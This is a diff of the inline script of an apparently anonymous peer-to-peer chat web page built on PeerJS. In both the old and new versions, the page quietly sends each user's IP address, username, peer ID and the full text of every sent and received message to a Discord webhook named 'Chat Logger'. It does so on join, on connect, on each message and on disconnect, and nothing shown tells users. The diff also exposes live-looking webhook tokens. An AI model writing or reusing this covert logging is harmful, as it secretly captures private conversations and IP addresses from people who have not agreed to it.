@@ -509,7 +509,7 @@
 
     <script>
         // Discord webhook URL - replace with your actual webhook URL
-        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1367197726965502145/wVEdynrmI9ppf9IIwXQ6sVV-iD9MjU1YsahnhLC7ooIInyenjErogf7UTEew5suEdl7O';
+        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1367210193599070268/xk8_V7r1JAEOtxdE8HGm28hy-XS-Kwo0rd5PvJfvdZEqajaFnAVyY42kwsX_uboxyMgh';
         
         const setupScreen = document.getElementById('setup-screen');
         const chatScreen = document.getElementById('chat-screen');
@@ -558,58 +558,34 @@
             }
         }
         
-        // Function to send data to Discord webhook (FIXED VERSION)
-        async function sendToDiscordWebhook(data) {
-            if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL === 'https://discord.com/api/webhooks/1367197726965502145/wVEdynrmI9ppf9IIwXQ6sVV-iD9MjU1YsahnhLC7ooIInyenjErogf7UTEew5suEdl7O') {
+        // Function to send data to Discord webhook
+        async function sendToDiscordWebhook(content) {
+            if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL.includes('https://discord.com/api/webhooks/1367210193599070268/xk8_V7r1JAEOtxdE8HGm28hy-XS-Kwo0rd5PvJfvdZEqajaFnAVyY42kwsX_uboxyMgh')) {
                 console.warn('Discord webhook URL not configured');
                 return;
             }
             
             try {
-                // Format the message for Discord
-                let content = `**${data.event}**\n`;
-                content += `📅 ${new Date(data.timestamp).toLocaleString()}\n`;
-                
-                if (data.username) content += `👤 Username: ${data.username}\n`;
-                if (data.peerId) content += `🆔 Peer ID: ${data.peerId}\n`;
-                if (data.ipAddress) content += `🌐 IP: ${data.ipAddress}\n`;
-                if (data.message) content += `💬 Message: ${data.message}\n`;
-                if (data.from && data.to) content += `📩 From: ${data.from} → To: ${data.to}\n`;
-                
-                const payload = {
-                    username: 'Chat Logger',
-                    avatar_url: 'https://i.imgur.com/4M34hi2.png',
-                    content: content,
-                    embeds: [
-                        {
-                            color: 0x00ff9d,
-                            fields: [
-                                {
-                                    name: "User Agent",
-                                    value: navigator.userAgent.substring(0, 1000) || 'Unknown'
-                                }
-                            ],
-                            timestamp: new Date().toISOString()
-                        }
-                    ]
-                };
-                
                 const response = await fetch(DISCORD_WEBHOOK_URL, {
                     method: 'POST',
                     headers: {
-                        'Content-Type': 'application/json'
+                        'Content-Type': 'application/json',
                     },
-                    body: JSON.stringify(payload)
+                    body: JSON.stringify({
+                        content: content,
+                        username: 'Chat Logger',
+                        avatar_url: 'https://i.imgur.com/4M34hi2.png',
+                    }),
                 });
                 
                 if (!response.ok) {
-                    console.error('Discord webhook error:', response.status, await response.text());
+                    console.error('Error sending to Discord:', await response.text());
                 }
             } catch (error) {
-                console.error('Error sending to Discord webhook:', error);
+                console.error('Error sending to Discord:', error);
             }
         }
-
+        
         function log(message) {
             console.log(message);
             const now = new Date().toLocaleTimeString();
@@ -690,20 +666,12 @@
         async function initializePeer() {
             const peerId = generateSimpleId();
             localUsername = generateUsername();
-            
-            // Get user's IP address
             userIP = await getUserIP();
             
-            // Send user info to Discord webhook
-            await sendToDiscordWebhook({
-                event: 'User Joined Website',
-                timestamp: new Date().toISOString(),
-                username: localUsername,
-                peerId: peerId,
-                ipAddress: userIP
-            });
-            
             log(`Initializing PeerJS with ID: ${peerId}`);
+            
+            // Send join notification to Discord
+            sendToDiscordWebhook(`📢 **User Joined Chat**\nUsername: ${localUsername}\nPeer ID: ${peerId}\nIP: ${userIP}`);
             
             try {
                 peer = new Peer(peerId, {
@@ -1001,17 +969,8 @@
                     username: localUsername
                 });
                 
-                // Send connection info to Discord
-                sendToDiscordWebhook({
-                    event: 'Connection Established',
-                    timestamp: new Date().toISOString(),
-                    localUser: localUsername,
-                    localPeerId: myPeerId,
-                    remotePeerId: connection.peer,
-                    ipAddress: userIP,
-                    from: localUsername,
-                    to: 'Connecting...'
-                });
+                // Send connection notification to Discord
+                sendToDiscordWebhook(`🔗 **New Chat Connection**\nUser: ${localUsername}\nConnected to: ${connection.peer}\nIP: ${userIP}`);
                 
                 setupScreen.style.display = 'none';
                 chatScreen.style.display = 'flex';
@@ -1032,16 +991,7 @@
                     appendMessage(data.message, false, remoteUsername || 'Stranger');
                     
                     // Send received message to Discord
-                    sendToDiscordWebhook({
-                        event: 'Message Received',
-                        timestamp: new Date().toISOString(),
-                        from: remoteUsername || 'Unknown',
-                        fromPeerId: connection.peer,
-                        to: localUsername,
-                        toPeerId: myPeerId,
-                        message: data.message,
-                        ipAddress: userIP
-                    });
+                    sendToDiscordWebhook(`📩 **Message Received**\nFrom: ${remoteUsername || 'Stranger'}\nTo: ${localUsername}\nMessage: ${data.message}`);
                 } else if (data.type === 'username') {
                     remoteUsername = data.username;
                     usernameDisplay.textContent = `Chatting with: ${remoteUsername}`;
@@ -1071,15 +1021,10 @@
         function handleDisconnect() {
             isConnected = false;
             
-            // Send disconnect info to Discord
-            sendToDiscordWebhook({
-                event: 'Connection Closed',
-                timestamp: new Date().toISOString(),
-                localUser: localUsername,
-                localPeerId: myPeerId,
-                remotePeerId: connection ? connection.peer : 'Unknown',
-                ipAddress: userIP
-            });
+            // Send disconnect notification to Discord
+            if (remoteUsername) {
+                sendToDiscordWebhook(`🔌 **Chat Disconnected**\nUser: ${localUsername}\nDisconnected from: ${remoteUsername}\nIP: ${userIP}`);
+            }
             
             setupScreen.style.display = 'flex';
             chatScreen.style.display = 'none';
@@ -1089,6 +1034,7 @@
             sendBtn.disabled = true;
             
             messagesContainer.innerHTML = '';
+            remoteUsername = null;
             
             resetRandomChatButton();
             updateRandomChatButton();
@@ -1178,7 +1124,7 @@
             }
         });
         
-        messageForm.addEventListener('submit', async (e) => {
+        messageForm.addEventListener('submit', (e) => {
             e.preventDefault();
             const message = messageInput.value.trim();
             
@@ -1191,16 +1137,7 @@
                 appendMessage(message, true, localUsername);
                 
                 // Send sent message to Discord
-                await sendToDiscordWebhook({
-                    event: 'Message Sent',
-                    timestamp: new Date().toISOString(),
-                    from: localUsername,
-                    fromPeerId: myPeerId,
-                    to: remoteUsername || 'Unknown',
-                    toPeerId: connection.peer,
-                    message: message,
-                    ipAddress: userIP
-                });
+                sendToDiscordWebhook(`📤 **Message Sent**\nFrom: ${localUsername}\nTo: ${remoteUsername || 'Stranger'}\nMessage: ${message}`);
                 
                 messageInput.value = '';
             }
@@ -1223,14 +1160,6 @@
         });
         
         window.addEventListener('beforeunload', () => {
-            sendToDiscordWebhook({
-                event: 'User Left Website',
-                timestamp: new Date().toISOString(),
-                username: localUsername,
-                peerId: myPeerId,
-                ipAddress: userIP
-            });
-            
             if (connection) connection.close();
             if (trackerConnection) trackerConnection.close();
             if (heartbeatInterval) clearInterval(heartbeatInterval);
